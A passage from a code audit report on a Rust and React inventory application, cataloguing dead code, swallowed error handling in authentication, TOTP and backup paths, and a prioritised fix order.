- Test-only helpers shipped as public API: `hash_password_sync`, `verify_password_sync`, `create_token` (`src/auth/mod.rs:321-357`). `create_token` fabricates a `User` with `is_admin: false`.
- `#[allow(unused_assignments)] { param_index += 1; }` (`src/db/mod.rs:2459-2462`) exists only to silence a lint on a write that is never read.

### DEAD2 — Unused frontend code · **Low**
Verified with `grep -rlw`, where the only hit is the defining file:
- `createSafePrintWindow`, `escapeHtml` (`utils/security.ts`). The whole module is unused.
- `isValidImageUrl` (`utils/sanitizeImageUrl.ts:63`), `getCurrencySymbol` (`utils/currencyFormat.ts:52`), `createDateFormatter` (`utils/dateFormat.ts:56`), `isUpdateAvailable` (`utils/versionCompare.ts:113`).
- `checkHealth` (`services/api.ts:508`), `getAuthToken` and `getAuthHeaders` (`context/AuthContext.tsx:355-366`), and `currentInventoryId` / `setCurrentInventoryId` (`context/AppContext.tsx:12-13, 37`).

### DEAD3 — Redundant or no-op code · **Low**
- `SET CONSTRAINTS ALL DEFERRED` is a no-op (BUG14).
- The `JsonConfig` error handler in `main.rs:192-207` is overridden by the scope-level config (ARCH P1).
- `::float8` casts on a column that is already `DOUBLE PRECISION` (`src/db/mod.rs` throughout, since V004).
- The duplicate `JsonConfig` / `PayloadConfig` (`main.rs:192-208` and `api/mod.rs:1652-1653`).
- `update_user_settings`'s preceding `let _ = get_or_create_user_settings` (`src/api/auth.rs:737-739`). It exists because `create_user_settings` failures were swallowed at user creation (ERR1). Fixing that removes the need for it.
- `JOIN items i` in `get_item_image_urls_by_inventory` (`src/db/mod.rs:1173`) selects no columns from `items`, so it only filters out orphan rows that the FK already prevents.
- `if data.len() >= 3` inside `detect_image_type` after `if data.len() < 4 { return None }` (`src/api/mod.rs:957-961`). The PNG check claims an 8-byte signature but compares only 4 bytes, and the GIF check compares 3 of 6 (`:965-970`).
- Upload size is enforced twice (`#[multipart(limit = "5MB")]` and `MAX_IMAGE_SIZE`, `api/mod.rs:1007-1013, 1041`). Backup has `limit = "100MB"` (`backup.rs:23`), but actix-multipart's default `MultipartFormConfig.total_limit` is 50 MiB, so the 100 MB figure is unreachable and uploads between 50 and 100 MB fail with a generic error.

---

## 5. Error handling: missing, inconsistent, or silently swallowed

### ERR1 — Security-relevant writes whose failures are discarded with `let _ =` · **Medium**
| Location | Swallowed operation | Consequence |
|---|---|---|
| `src/api/totp.rs:192-194, 338, 465` | `increment_totp_failed_attempts` | If it fails, the brute-force counter never advances, so there is no lockout |
| `src/api/totp.rs:347-348, 500-501` | `reset_totp_failed_attempts`, `update_totp_last_used` | The user can stay locked out after a successful login, and `last_used_at` (needed for replay protection, SEC6) is unreliable |
| `src/api/auth.rs:2223-2226` | `mark_recovery_code_used` (logged, request still succeeds) | The one-time code stays valid (BUG10) |
| `src/api/auth.rs:226-228, 497-502, 900` | `create_user_settings` | The user has no settings row. Later code depends on `get_or_create` paths to recover |
| `src/api/auth.rs:737-739` | `get_or_create_user_settings` | An error is ignored, and the following update then returns a misleading 404 "Settings not found" |
| `src/api/auth.rs:321` | `get_totp_settings(...).ok()` | TOTP bypass (SEC3) |
| `src/api/auth.rs:968, 1096` | `count_admin_users().unwrap_or(0)` | This one fails closed, which is correct, but by accident. Make it explicit |
| `src/api/backup.rs:258, 386, 392, 464, 591` | `try_exists(...).unwrap_or(false)` | A permission error looks like "file not found", so the overwrite protection is skipped |

### ERR2 — Multi-step operations report success after a partial failure · **Medium**
- **Item create and update** (`frontend/src/pages/InventoryDetailPage.tsx:209-211, 323-325`): `await itemApi.setOrganizerValues(...)` is called without checking `.success`. The toast says "Item added successfully!" even when every organizer value, including **required** ones and the image, failed to save.
- **Register and setup** (`frontend/src/pages/RegisterPage.tsx:78-90`, `SetupPage.tsx:92-104`): the token is written to `localStorage` before recovery-code generation. If generation fails, the page shows an error, but the user is already logged in through storage that `AuthContext` does not know about (ARCH P5).
- **Backend:** `initial_setup` and `register` create the user, then settings (swallowed), then return a token. `admin_update_user` changes the password, then may fail the metadata update (BUG17). `use_recovery_code` changes the password and then may fail to mark the code. `set_item_organizer_values` loops without a transaction (BUG15). `store_recovery_codes` runs delete, insert, and update without a transaction (BUG10).

### ERR3 — DB errors are classified by string matching or collapsed to 500 · **Medium**
**Files:** `src/api/auth.rs:1323, 1622`, `src/api/auth.rs:433-439, 866-872`
**Root cause:** ARCH A7.

- Duplicate detection uses `e.to_string().contains("duplicate") || contains("unique")`. Any error message containing "unique", such as a unique-index failure on a different column, is misreported as "Already shared".
- Username uniqueness is checked with `if let Ok(Some(_)) = get_user_by_username(...)`. A DB **error** on that lookup is treated as "not taken". Combined with the check-then-insert race, the subsequent `create_user` unique violation surfaces as a 500 ("An internal error occurred" or a leaked constraint name) instead of 409.
- FK violations (`default_inventory_id`, `inventory_id` on items, `organizer_type_id`) and CHECK violations (BUG5) all become 500.

### ERR4 — Frontend error handling gaps · **Low**
- **Raw `fetch` bypasses 401 and JSON handling:** `backupApi.download` (`services/api.ts:1013-1033`) throws a generic `Error('Download failed')` for any status, so the server's error body is lost and an expired session is not handled. `backupApi.upload` (`:1039-1050`) and `useVersionCheck` (`:100, 120`) also skip the retry and auth handling.
- **No React error boundary** in `App.tsx` / `main.tsx`. Any render-time throw (BUG16, a null `settings_json`, an unexpected API shape) unmounts the whole app to a blank page.
- **`handleResponse` treats non-JSON as failure but logs only 200 characters** (`api.ts:100-110`). With the dead JSON error handler (ARCH P1), malformed-request 400s reach the user as "Expected JSON but received text/plain".
- **Errors swallowed in silent `catch {}`** with no logging: `InventoryDetailPage.tsx:136-138, 255-257, 290-292`, and `RegisterPage.tsx:93-96`, which logs "Registration error" without the error object.
- **`useVersionCheck` turns every GitHub failure into `null`** (`:155-158`) and never surfaces it. The CSP block (ARCH D4) is therefore indistinguishable from "no update".

---

## Suggested fix order

1. **SEC1, SEC2, SEC3, SEC4**: authorization on all data endpoints, ownership checks, TOTP fail-closed, and password required for recovery-code regeneration. These are small diffs with the largest risk reduction.
2. **BUG2 + BUG14**: include `user_totp_settings` in backups and make export and restore transactional and consistent before anyone relies on restore.
3. **SEC5, SEC6, SEC8**: per-account limits on unauthenticated hashing, atomic TOTP attempt counting with replay protection, and token invalidation on password change.
4. **BUG1, BUG4, BUG12, BUG16**: user-visible frontend breakage that each takes only a few lines to fix.
5. **BUG3, BUG5, BUG6, BUG7, BUG8**: input validation and edit-flow correctness.
6. **PERF1 + PERF2**: stop shipping base64 images in list responses, and return item counts from the server.
7. Error handling (ERR1–ERR3), then dead-code removal (DEAD1–DEAD3).
